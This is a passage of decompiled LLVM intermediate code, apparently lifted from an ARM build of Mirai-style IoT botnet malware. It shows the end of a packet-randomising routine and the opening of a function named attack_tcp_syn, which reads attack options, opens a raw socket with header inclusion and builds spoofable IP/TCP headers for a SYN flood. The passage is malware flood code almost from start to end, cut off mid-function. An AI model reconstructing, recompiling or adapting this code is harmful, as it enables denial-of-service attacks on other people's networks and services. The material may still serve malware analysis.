dec_label_pc_a438.dec_label_pc_a2f0_crit_edge:    ; preds = %dec_label_pc_a438
  %v1_a2f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a2f0

dec_label_pc_a454:                                ; preds = %dec_label_pc_a438, %dec_label_pc_a2dc
  %v0_a454 = call i32 @rand_next()
  %v1_a454 = trunc i32 %v0_a454 to i16
  store i32 %v0_a454, i32* %r0.global-to-local, align 4
  store i32 %v3_a050, i32* %r2.global-to-local, align 4
  %v1_a45c = load i32, i32* @r4, align 4
  %v9_a45c = icmp eq i32 %v3_a050, %v1_a45c
  store i1 %v9_a45c, i1* %cpsr_z.global-to-local, align 1
  %v3_a460 = load i32, i32* @r5, align 4
  %v4_a460 = add i32 %v3_a460, 4
  %v5_a460 = inttoptr i32 %v4_a460 to i16*
  store i16 %v1_a454, i16* %v5_a460, align 2
  br i1 %v9_a45c, label %dec_label_pc_a468, label %dec_label_pc_a454.dec_label_pc_a2fc_crit_edge

dec_label_pc_a454.dec_label_pc_a2fc_crit_edge:    ; preds = %dec_label_pc_a454
  %v1_a300.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a2fc

dec_label_pc_a468:                                ; preds = %dec_label_pc_a454, %dec_label_pc_a2f0
  %v0_a468 = call i32 @rand_next()
  %v1_a468 = trunc i32 %v0_a468 to i16
  store i32 %v0_a468, i32* %r0.global-to-local, align 4
  store i32 %v3_a054, i32* %r3.global-to-local, align 4
  %v1_a470 = load i32, i32* @r4, align 4
  %v9_a470 = icmp eq i32 %v3_a054, %v1_a470
  store i1 %v9_a470, i1* %cpsr_z.global-to-local, align 1
  %v3_a474 = load i32, i32* @r5, align 4
  %v4_a474 = add i32 %v3_a474, 20
  %v5_a474 = inttoptr i32 %v4_a474 to i16*
  store i16 %v1_a468, i16* %v5_a474, align 2
  br i1 %v9_a470, label %dec_label_pc_a47c, label %dec_label_pc_a468.dec_label_pc_a308_crit_edge

dec_label_pc_a468.dec_label_pc_a308_crit_edge:    ; preds = %dec_label_pc_a468
  %v1_a30c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a308

dec_label_pc_a47c:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a2fc
  %v0_a47c = call i32 @rand_next()
  %v1_a47c = trunc i32 %v0_a47c to i16
  store i32 %v0_a47c, i32* %r0.global-to-local, align 4
  store i32 %v6_9edc, i32* %ip.global-to-local, align 4
  %v1_a484 = load i32, i32* @r4, align 4
  %v9_a484 = icmp eq i32 %v6_9edc, %v1_a484
  store i1 %v9_a484, i1* %cpsr_z.global-to-local, align 1
  %v3_a488 = load i32, i32* @r6, align 4
  %v4_a488 = add i32 %v3_a488, 2
  %v5_a488 = inttoptr i32 %v4_a488 to i16*
  store i16 %v1_a47c, i16* %v5_a488, align 2
  br i1 %v9_a484, label %dec_label_pc_a490, label %dec_label_pc_a47c.dec_label_pc_a314_crit_edge

dec_label_pc_a47c.dec_label_pc_a314_crit_edge:    ; preds = %dec_label_pc_a47c
  %v1_a318.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a314

dec_label_pc_a490:                                ; preds = %dec_label_pc_a47c, %dec_label_pc_a308
  %v0_a490 = call i32 @rand_next()
  %v1_a494 = load i32, i32* @r6, align 4
  %v2_a494 = add i32 %v1_a494, 4
  %v3_a494 = inttoptr i32 %v2_a494 to i32*
  store i32 %v0_a490, i32* %v3_a494, align 4
  store i32 %v6_9ef8, i32* %r0.global-to-local, align 4
  %v1_a49c = load i32, i32* @r4, align 4
  %v9_a49c = icmp eq i32 %v6_9ef8, %v1_a49c
  store i1 %v9_a49c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a49c, label %dec_label_pc_a4a4, label %dec_label_pc_a320

dec_label_pc_a4a4:                                ; preds = %dec_label_pc_a490, %dec_label_pc_a314
  %v0_a4a4 = call i32 @rand_next()
  store i32 %v0_a4a4, i32* %r0.global-to-local, align 4
  store i32 %v1_9fc8, i32* %r1.global-to-local, align 4
  store i1 %v2_a4ac, i1* %cpsr_z.global-to-local, align 1
  %v1_a4b0 = load i32, i32* @r6, align 4
  %v2_a4b0 = add i32 %v1_a4b0, 8
  %v3_a4b0 = inttoptr i32 %v2_a4b0 to i32*
  store i32 %v0_a4a4, i32* %v3_a4b0, align 4
  br i1 %v2_a4ac, label %dec_label_pc_a32c, label %dec_label_pc_a4b8

dec_label_pc_a4b8:                                ; preds = %dec_label_pc_a320, %dec_label_pc_a4a4
  %v0_a4b8 = load i32, i32* @r5, align 4
  %v1_a4b8 = add i32 %v0_a4b8, 40
  store i32 %v1_a4b8, i32* @r4, align 4
  store i32 %v1_a4b8, i32* %r0.global-to-local, align 4
  %v0_a4c0 = load i32, i32* @r8, align 4
  store i32 %v0_a4c0, i32* %r1.global-to-local, align 4
  %v2_a4c4 = call i32 @rand_alphastr(i32 %v1_a4b8, i32 %v0_a4c0)
  store i32 %v2_a4c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a4cc = load i32, i32* @r4, align 4
  %v3_a4cc = load i32, i32* @r8, align 4
  %v4_a4cc = add i32 %v3_a4cc, %v2_a4cc
  %v5_a4cc = inttoptr i32 %v4_a4cc to i8*
  store i8 0, i8* %v5_a4cc, align 1
  br label %dec_label_pc_a32c

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a298
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a4d8 = call i32 @__GI_time(i32* null)
  store i32 %v2_a4d8, i32* %r0.global-to-local, align 4
  store i32 %v2_9fec, i32* %r1.global-to-local, align 4
  %v9_a4e0 = icmp eq i32 %v2_9fec, %v2_a4d8
  store i1 %v9_a4e0, i1* %cpsr_z.global-to-local, align 1
  %v6_a4e4 = icmp slt i32 %v2_9fec, %v2_a4d8
  br i1 %v6_a4e4, label %dec_label_pc_a4e8, label %dec_label_pc_a298

dec_label_pc_a4e8:                                ; preds = %dec_label_pc_a4d4, %entry, %dec_label_pc_a4f4
  %v1_a4f0 = phi i32 [ %v3_a000, %entry ], [ %v1_a4f8, %dec_label_pc_a4f4 ], [ %v2_a4d8, %dec_label_pc_a4d4 ]
  store i32 %v18_9de0, i32* %sb.global-to-local, align 4
  store i32 %v24_9de0, i32* %fp.global-to-local, align 4
  store i32 %v27_9de0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4f0

dec_label_pc_a4f4:                                ; preds = %dec_label_pc_a010
  store i32 %v3_a000, i32* %r0.global-to-local, align 4
  %v1_a4f8 = call i32 @__GI___libc_close(i32 %v3_a000)
  store i32 %v1_a4f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a4e8

; uselistorder directives
  uselistorder i32 %v1_a4f8, { 1, 0 }
  uselistorder i32 %v0_a47c, { 1, 0 }
  uselistorder i32 %v0_a468, { 1, 0 }
  uselistorder i32 %v0_a454, { 1, 0 }
  uselistorder i32 %v5_a428, { 1, 0 }
  uselistorder i32 %v3_a3d8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_a3a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_a36c, { 1, 0 }
  uselistorder i32 %v4_a35c, { 1, 0 }
  uselistorder i32 %v0_a2ac, { 2, 1, 0 }
  uselistorder i1 %v2_a4ac, { 2, 3, 1, 0 }
  uselistorder i1 %v3_a448, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a2d4, { 2, 1, 0 }
  uselistorder i32 %v1_a284, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a254, { 1, 0 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a0e8, { 2, 0, 1 }
  uselistorder i32 %v1_a0e4, { 2, 0, 1 }
  uselistorder i32 %v1_a0d4, { 1, 0 }
  uselistorder i1 %v2_a058, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a04c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a048, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a044, { 1, 0, 2 }
  uselistorder i1 %v7_a030, { 1, 0 }
  uselistorder i1 %v7_a004, { 1, 0 }
  uselistorder i32 %v3_a000, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_9fec, { 2, 1, 0 }
  uselistorder i32 %v6_9fdc, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_9fc8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9f40, { 0, 2, 1, 3 }
  uselistorder i32 %v6_9ef8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_9edc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_9e8c, { 1, 2, 0 }
  uselistorder i32 %v1_9e68, { 2, 1, 0 }
  uselistorder i32 %v6_9e60, { 1, 0 }
  uselistorder i32 %v7_9e48, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_9e24, { 2, 1, 3, 0 }
  uselistorder i32 %v2_9e0c, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 7, 5, 8, 6, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20, 21, 23, 22, 29, 24, 25, 26, 27, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 3, 2, 1, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_a4e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4b8, { 1, 0 }
  uselistorder label %dec_label_pc_a32c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a298, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a504 = load i32, i32* @r4, align 4
  %v24_a504 = load i32, i32* @fp, align 4
  %v27_a504 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_a530 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_a534 = load i32, i32* @r4, align 4
  store i32 %v0_a534, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a530, i32* @sl, align 4
  %v0_a544 = load i32, i32* @r5, align 4
  store i32 %v0_a544, i32* %r0.global-to-local, align 4
  %v5_a548 = inttoptr i32 %v0_a534 to i32*
  %v6_a548 = call i32 @attack_get_opt_int(i32 %v0_a544, i32* %v5_a548, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a560 = load i32, i32* @r4, align 4
  store i32 %v0_a560, i32* %r1.global-to-local, align 4
  %v0_a564 = load i32, i32* @r5, align 4
  store i32 %v0_a564, i32* %r0.global-to-local, align 4
  %v5_a568 = trunc i32 %v6_a548 to i8
  %v6_a56c = inttoptr i32 %v0_a560 to i32*
  %v7_a56c = call i32 @attack_get_opt_int(i32 %v0_a564, i32* %v6_a56c, i32 3, i32 65535, i32 %v6_a548)
  %v0_a570 = load i32, i32* @r4, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_a580 = load i32, i32* @r5, align 4
  store i32 %v0_a580, i32* %r0.global-to-local, align 4
  %v5_a584 = inttoptr i32 %v0_a570 to i32*
  %v6_a584 = call i32 @attack_get_opt_int(i32 %v0_a580, i32* %v5_a584, i32 4, i32 64, i32 %v7_a56c)
  %v1_a58c = urem i32 %v6_a584, 256
  %v0_a590 = load i32, i32* @r4, align 4
  store i32 %v0_a590, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r0.global-to-local, align 4
  %v6_a5a4 = inttoptr i32 %v0_a590 to i32*
  %v7_a5a4 = call i32 @attack_get_opt_int(i32 %v0_a59c, i32* %v6_a5a4, i32 5, i32 1, i32 %v1_a58c)
  %v1_a5b0 = urem i32 %v7_a5a4, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r1.global-to-local, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  store i32 %v0_a5c0, i32* %r0.global-to-local, align 4
  %v5_a5c8 = inttoptr i32 %v0_a5bc to i32*
  %v6_a5c8 = call i32 @attack_get_opt_int(i32 %v0_a5c0, i32* %v5_a5c8, i32 6, i32 65535, i32 %v1_a5b0)
  %v0_a5d4 = load i32, i32* @r4, align 4
  store i32 %v0_a5d4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a5e0 = load i32, i32* @r5, align 4
  store i32 %v0_a5e0, i32* %r0.global-to-local, align 4
  %v5_a5e4 = inttoptr i32 %v0_a5d4 to i32*
  %v6_a5e4 = call i32 @attack_get_opt_int(i32 %v0_a5e0, i32* %v5_a5e4, i32 7, i32 65535, i32 %v6_a5c8)
  %v0_a5ec = load i32, i32* @r4, align 4
  store i32 %v0_a5ec, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_a5e4, i32* %fp.global-to-local, align 4
  %v0_a5fc = load i32, i32* @r5, align 4
  store i32 %v0_a5fc, i32* %r0.global-to-local, align 4
  %v5_a600 = inttoptr i32 %v0_a5ec to i32*
  %v6_a600 = call i32 @attack_get_opt_int(i32 %v0_a5fc, i32* %v5_a600, i32 16, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_a604 = load i32, i32* @r4, align 4
  store i32 %v0_a604, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a614 = load i32, i32* @r5, align 4
  store i32 %v0_a614, i32* %r0.global-to-local, align 4
  %v5_a618 = inttoptr i32 %v0_a604 to i32*
  %v6_a618 = call i32 @attack_get_opt_int(i32 %v0_a614, i32* %v5_a618, i32 17, i32 0, i32 %v6_a600)
  %v0_a61c = load i32, i32* @r4, align 4
  store i32 %v0_a61c, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a62c = load i32, i32* @r5, align 4
  store i32 %v0_a62c, i32* %r0.global-to-local, align 4
  %v5_a630 = inttoptr i32 %v0_a61c to i32*
  %v6_a630 = call i32 @attack_get_opt_int(i32 %v0_a62c, i32* %v5_a630, i32 10, i32 0, i32 %v6_a618)
  %v0_a634 = load i32, i32* @r4, align 4
  store i32 %v0_a634, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a644 = load i32, i32* @r5, align 4
  store i32 %v0_a644, i32* %r0.global-to-local, align 4
  %v5_a648 = inttoptr i32 %v0_a634 to i32*
  %v6_a648 = call i32 @attack_get_opt_int(i32 %v0_a644, i32* %v5_a648, i32 11, i32 0, i32 %v6_a630)
  %v0_a64c = load i32, i32* @r4, align 4
  store i32 %v0_a64c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a65c = load i32, i32* @r5, align 4
  store i32 %v0_a65c, i32* %r0.global-to-local, align 4
  %v5_a660 = inttoptr i32 %v0_a64c to i32*
  %v6_a660 = call i32 @attack_get_opt_int(i32 %v0_a65c, i32* %v5_a660, i32 12, i32 0, i32 %v6_a648)
  %v0_a664 = load i32, i32* @r4, align 4
  store i32 %v0_a664, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a674 = load i32, i32* @r5, align 4
  store i32 %v0_a674, i32* %r0.global-to-local, align 4
  %v5_a678 = inttoptr i32 %v0_a664 to i32*
  %v6_a678 = call i32 @attack_get_opt_int(i32 %v0_a674, i32* %v5_a678, i32 13, i32 0, i32 %v6_a660)
  %v0_a67c = load i32, i32* @r4, align 4
  store i32 %v0_a67c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a68c = load i32, i32* @r5, align 4
  store i32 %v0_a68c, i32* %r0.global-to-local, align 4
  %v5_a690 = inttoptr i32 %v0_a67c to i32*
  %v6_a690 = call i32 @attack_get_opt_int(i32 %v0_a68c, i32* %v5_a690, i32 14, i32 1, i32 %v6_a678)
  %v0_a694 = load i32, i32* @r4, align 4
  store i32 %v0_a694, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r5, align 4
  store i32 %v0_a6a4, i32* %r0.global-to-local, align 4
  %v5_a6a8 = inttoptr i32 %v0_a694 to i32*
  %v6_a6a8 = call i32 @attack_get_opt_int(i32 %v0_a6a4, i32* %v5_a6a8, i32 15, i32 0, i32 %v6_a690)
  %v0_a6b0 = load i32, i32* @r4, align 4
  store i32 %v0_a6b0, i32* %r1.global-to-local, align 4
  %v2_a6b4 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_a6b4, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_a6c0 = load i32, i32* @r5, align 4
  store i32 %v0_a6c0, i32* %r0.global-to-local, align 4
  %v5_a6c4 = inttoptr i32 %v0_a6b0 to i32*
  %v6_a6c4 = call i32 @attack_get_opt_ip(i32 %v0_a6c0, i32* %v5_a6c4, i32 24, i32 %v2_a6b4, i32 %v6_a6a8)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a6d0 = call i32 @__GI_time(i32* null)
  %v1_a6d4 = load i32, i32* @r6, align 4
  %v2_a6d4 = add i32 %v1_a6d4, %v2_a6d0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v7_a6ec = icmp eq i32 %v3_a6e8, -1
  store i1 %v7_a6ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a6e8, i32* @r8, align 4
  br i1 %v7_a6ec, label %dec_label_pc_abc0, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a700 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a700, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a714 = call i32 @__GI_setsockopt(i32 %v3_a6e8, i32 0, i32 3, i32 %v6_a700, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a714, i32* %r0.global-to-local, align 4
  %v7_a718 = icmp eq i32 %v5_a714, -1
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_abcc, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a6f8
  %v3_a72c = mul i32 %v7_a56c, 65536
  store i32 %v3_a72c, i32* %r0.global-to-local, align 4
  %v0_a734 = load i32, i32* %fp.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_a630, i32* %r1.global-to-local, align 4
  %v3_a740 = urem i32 %v7_a56c, 65536
  store i32 %v3_a740, i32* %r2.global-to-local, align 4
  %v3_a744 = urem i32 %v6_a5c8, 65536
  store i32 %v3_a744, i32* %r3.global-to-local, align 4
  %v3_a748 = urem i32 %v0_a734, 65536
  %v0_a74c = load i32, i32* @sb, align 4
  %v2_a74c = icmp eq i32 %v0_a74c, 0
  store i1 %v2_a74c, i1* %cpsr_z.global-to-local, align 1
  %v1_a75c = urem i32 %v6_a630, 256
  store i32 %v1_a75c, i32* @fp, align 4
  br i1 %v2_a74c, label %dec_label_pc_a9b0.preheader, label %dec_label_pc_a764

dec_label_pc_a764:                                ; preds = %dec_label_pc_a720
  %trunc = trunc i32 %v7_a56c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp60 = mul nuw nsw i32 %v3_a744, 256
  %v3_a790 = and i32 %tmp60, 65280
  %tmp61 = mul i32 %v0_a734, 256
  %v3_a794 = and i32 %tmp61, 65280
  %tmp62 = mul i32 %v6_a600, 256
  %v3_a798 = and i32 %tmp62, 65280
  %v1_a79c = urem i32 %v6_a630, 2
  %tmp63 = udiv i32 %v6_a5c8, 256
  %v4_a7a0 = urem i32 %tmp63, 256
  %v5_a7a0 = or i32 %v3_a790, %v4_a7a0
  %tmp64 = udiv i32 %v0_a734, 256
  %v4_a7a4 = urem i32 %tmp64, 256
  %v5_a7a4 = or i32 %v4_a7a4, %v3_a794
  store i32 %v5_a7a4, i32* @r5, align 4
  %tmp65 = udiv i32 %v6_a600, 256
  %v4_a7a8 = urem i32 %tmp65, 256
  %v5_a7a8 = or i32 %v4_a7a8, %v3_a798
  store i32 %v5_a7a8, i32* @lr, align 4
  %v1_a7bc = urem i32 %v6_a648, 2
  store i32 %v1_a7bc, i32* %r1.global-to-local, align 4
  %v1_a7c0 = urem i32 %v6_a660, 2
  store i32 %v1_a7c0, i32* %r2.global-to-local, align 4
  %v1_a7c4 = urem i32 %v6_a678, 2
  store i32 %v1_a7c4, i32* %r3.global-to-local, align 4
  %v1_a7c8 = urem i32 %v6_a690, 2
  store i32 %v1_a7c8, i32* @r6, align 4
  %v1_a7cc = urem i32 %v6_a6a8, 2
  store i32 %v1_a7cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_a848 = trunc i32 %v6_a584 to i8
  %sext6 = mul nuw i32 %v5_a7a0, 65536
  %v4_a874 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_a7a4, 65536
  %v6_a8b0 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_a7bc
  %v4_a8c8 = and i32 %tmp, 16
  %tmp66 = sub nsw i32 0, %v1_a7c0
  %v4_a8e0 = and i32 %tmp66, 8
  %tmp67 = sub nsw i32 0, %v1_a7c4
  %v4_a8f4 = and i32 %tmp67, 4
  %tmp68 = sub nsw i32 0, %v1_a7c8
  %v3_a908 = and i32 %tmp68, 2
  br label %dec_label_pc_a7f4

dec_label_pc_a7f4:                                ; preds = %.thread, %dec_label_pc_a764
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_a7fc = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_a7fc, i32* %r0.global-to-local, align 4
  %v3_a800 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a800, i32* %r2.global-to-local, align 4
  %v1_a804 = load i32, i32* @sl, align 4
  %v2_a804 = load i32, i32* @r4, align 4
  %v5_a804 = mul i32 %v2_a804, 4
  %v6_a804 = add i32 %v5_a804, %v1_a804
  %v7_a804 = inttoptr i32 %v6_a804 to i32*
  store i32 %v2_a7fc, i32* %v7_a804, align 4
  %v0_a808 = load i32, i32* %r2.global-to-local, align 4
  %v3_a808 = mul i32 %v0_a808, 32
  store i32 %v3_a808, i32* %r3.global-to-local, align 4
  %v0_a80c = load i32, i32* @sl, align 4
  %v4_a80c = mul i32 %v0_a808, 4
  %v5_a80c = add i32 %v0_a80c, %v4_a80c
  %v6_a80c = inttoptr i32 %v5_a80c to i32*
  %v7_a80c = load i32, i32* %v6_a80c, align 4
  store i32 %v7_a80c, i32* %r4.global-to-local, align 4
  %v5_a810 = mul i32 %v0_a808, 24
  store i32 %v5_a810, i32* %r3.global-to-local, align 4
  %v1_a814 = load i32, i32* @r7, align 4
  %v2_a814 = add i32 %v1_a814, %v5_a810
  store i32 %v2_a814, i32* %r0.global-to-local, align 4
  %v1_a818 = inttoptr i32 %v7_a80c to i8*
  %v2_a818 = load i8, i8* %v1_a818, align 1
  %tmp69 = urem i8 %v2_a818, 16
  %v1_a81c = zext i8 %tmp69 to i32
  %v1_a820 = or i32 %v1_a81c, 64
  store i32 %v1_a820, i32* %r3.global-to-local, align 4
  %v1_a824 = trunc i32 %v1_a820 to i8
  store i8 %v1_a824, i8* %v1_a818, align 1
  %v0_a828 = load i32, i32* %r4.global-to-local, align 4
  %v1_a828 = inttoptr i32 %v0_a828 to i8*
  %v2_a828 = load i8, i8* %v1_a828, align 1
  %v1_a82c = and i8 %v2_a828, -16
  %v1_a830 = or i8 %v1_a82c, 5
  store i32 %v1_a5b0, i32* %r1.global-to-local, align 4
  store i8 %v1_a830, i8* %v1_a828, align 1
  %v2_a840 = load i32, i32* %r4.global-to-local, align 4
  %v3_a840 = add i32 %v2_a840, 1
  %v4_a840 = inttoptr i32 %v3_a840 to i8*
  store i8 %v5_a568, i8* %v4_a840, align 1
  store i32 %v1_a58c, i32* %r3.global-to-local, align 4
  %v2_a848 = load i32, i32* %r4.global-to-local, align 4
  %v3_a848 = add i32 %v2_a848, 8
  %v4_a848 = inttoptr i32 %v3_a848 to i8*
  store i8 %v1_a848, i8* %v4_a848, align 1
  %v0_a850 = load i32, i32* %r1.global-to-local, align 4
  %v2_a850 = icmp eq i32 %v0_a850, 0
  store i1 %v2_a850, i1* %cpsr_z.global-to-local, align 1
  %v2_a854 = load i32, i32* %r4.global-to-local, align 4
  %v3_a854 = add i32 %v2_a854, 4
  %v4_a854 = inttoptr i32 %v3_a854 to i16*
  store i16 %rev, i16* %v4_a854, align 2
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_a85c = load i32, i32* %r4.global-to-local, align 4
  %v3_a85c = add i32 %v2_a85c, 9
  %v4_a85c = inttoptr i32 %v3_a85c to i8*
  store i8 6, i8* %v4_a85c, align 1
  %v0_a860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a860, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a7f4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a864 = load i32, i32* %r4.global-to-local, align 4
  %v4_a864 = add i32 %v3_a864, 6
  %v5_a864 = inttoptr i32 %v4_a864 to i16*
  store i16 64, i16* %v5_a864, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a7f4, %bb
  store i32 %v6_a6c4, i32* %r3.global-to-local, align 4
  %v1_a86c = load i32, i32* %r4.global-to-local, align 4
  %v2_a86c = add i32 %v1_a86c, 12
  %v3_a86c = inttoptr i32 %v2_a86c to i32*
  store i32 %v6_a6c4, i32* %v3_a86c, align 4
  %v0_a870 = load i32, i32* %r0.global-to-local, align 4
  %v1_a870 = add i32 %v0_a870, 16
  %v2_a870 = inttoptr i32 %v1_a870 to i32*
